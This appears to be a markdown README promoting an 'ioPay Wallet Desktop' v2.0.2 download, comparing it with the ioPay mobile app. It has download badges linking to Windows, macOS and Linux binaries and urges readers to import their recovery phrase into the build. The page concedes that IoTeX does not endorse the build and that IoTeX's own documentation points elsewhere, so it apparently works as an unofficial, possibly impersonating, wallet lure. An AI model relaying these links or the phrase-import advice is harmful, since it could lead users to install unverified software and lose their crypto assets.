![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Desktop vs the ioPay Mobile App

Three different things get called "the ioPay app", and conflating them causes most of the confusion this page exists to fix:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

1. **The mobile app** - ioPay on a phone, with its own release history.
2. **The desktop wallet** - *Iopay Wallet Desktop*, currently **v2.0.2, 19 November 2026**, for Windows, macOS and Linux (F001, F010).
3. **The web wallet** - a separate browser-based interface, not this build (Q113).

They share a chain and, if you import the same phrase, an account (F018). They are not the same application.

## What they have in common

- **The chain** - IoTeX, its accounts and its addresses.
- **Account portability** - a phrase imported into either sees the same account, the same balances and the same staking positions.
- **Address formats** - both see `io1...` and `0x...` as two encodings of one account.

That is why moving between them is an **import**, not a transfer: nothing moves on-chain, the second app simply opens the same account.

## Where they differ

**Platform and posture.** The mobile app lives on a phone and travels with you. The desktop app gives a full window, USB hardware-wallet support and files you control.

**Depth of interface.** Staking across long durations, validator comparison, bridge status, DePIN device lists and tax exports are all easier on a large screen - that is what the desktop build is for.

**Release history.** Separate builds, separate releases. A feature in one is not automatically in the other, and a version number from one tells you nothing about the other.

**Backup model.** Both depend on the phrase, key or keystore of the account. The app you use does not change what your backup has to be.

## What about the web wallet?

Q113: it is a separate interface, not this desktop build. If you are looking for a browser-based route, that is a different product from the one this page describes, and this page will not describe its features - they are not in this project's documentation.

## The endorsement question, once

Worth stating because it comes up whenever "official app" is in the query: **nothing published states that IoTeX endorses this desktop build** (F041), and IoTeX's own documentation routes desktop readers through an earlier-generation application rather than this one (F042).

That is a documentation gap, not a status claim about ioPay - and it is why this page describes what the build is rather than what a badge would say.

## Which should you use?

**Phone only, moving around:** the mobile app, for holding and payments.

**Staking, bridging, DePIN income, records:** the desktop wallet.

**Both:** the common answer, with one phrase and one backup, each app kept current.

If you are moving from one to the other right now, [the migration page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/moving-iotx-from-iopay-mobile-to-desktop-wallet.md) has the steps, and [what ioPay Wallet is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md) covers the desktop product itself. For browser extensions specifically, [that comparison](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/using-iopay-wallet-beside-browser-extensions.md) is separate again.

## FAQ

**Is the IoTeX Web Wallet separate from ioPay?**
Yes. The web wallet is a different interface from this desktop build.

**Is the desktop app just the mobile app for PC?**
No. Separate builds with separate releases, sharing a chain and account portability.

**Can I use the same account on both?**
Yes - import the same phrase, key or keystore into both.

**Do I have to choose one?**
No. A common arrangement is to keep the phone for holding and the desktop for staking and records.

**Which is safer?**
Different surfaces: a phone is harder to lose data from, a desktop supports USB hardware signing. Neither removes the need for a tested backup.

## The one table worth keeping

| | Mobile app | Desktop wallet |
|---|---|---|
| Runs on | a phone | Windows, macOS or Linux (F010) |
| Strongest at | holding, paying, checking a balance | staking terms, validator comparison, bridge status, DePIN device lists, records |
| Hardware signing | not over USB | Ledger and Trezor over USB (F028) |
| Backup it needs | phrase, key or keystore | the same three artifacts (F050) |
| Version to check | the mobile app's own | v2.0.2 for this build |

Nothing in that table is a ranking. The phone wins on being with you; the desktop wins on screen, keyboard, files and USB signing. A wallet that is not with you cannot pay for anything, and a phone is a poor place to compare validator commissions across a long duration.

## The phrase is the only bridge between them

Every difference above collapses into one shared fact: the account is on-chain, and what either app holds is a way to sign for it. The phrase - or the key, or the keystore - is the asset that matters, and importing it is the whole migration. [The migration page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/moving-iotx-from-iopay-mobile-to-desktop-wallet.md) has the steps, and the backup rules do not change when the app does.

So the safety question is never "which app is safer" but "where does the key live, and can you restore it". A phone with the phrase written down beats a desktop without it, and the reverse is equally true.

## If you only ever use one

**Phone only** is coherent if your activity is holding, receiving and paying. You will set up staking on a small screen, and that is the cost.

**Desktop only** is coherent if the wallet is a workstation tool - staking, bridging, device income, exports for records. Receiving payments is less convenient, and that is the cost.

Both is the common answer, and it is the one that makes backup discipline matter most: two installations, one phrase, one tested restore.


## Keeping two installations in step

Two apps on one account is possible, and it only becomes a problem when the versions drift. Each app has its own release history, so an update on the phone says nothing about the desktop build, and the other way round. Check the version in each before you compare behaviour between them, and treat a difference in what a screen shows as a version question first.

The phrase is the only thing that carries across, and it carries nothing else: settings and preferences stay with the app that holds them. One account, two interfaces, one backup - that is the arrangement whichever of the two you happen to be using, and the backup is the piece that has to be current.

Release cadence is the practical check. Note the version each app reports the last time you updated it, so a difference in behaviour between phone and desktop can be read as a version difference rather than a fault in either.

---

*Desktop platform coverage and version from the release (F001, F010); import behaviour from F018; endorsement and documentation status from F041/F042, stated without status language.*
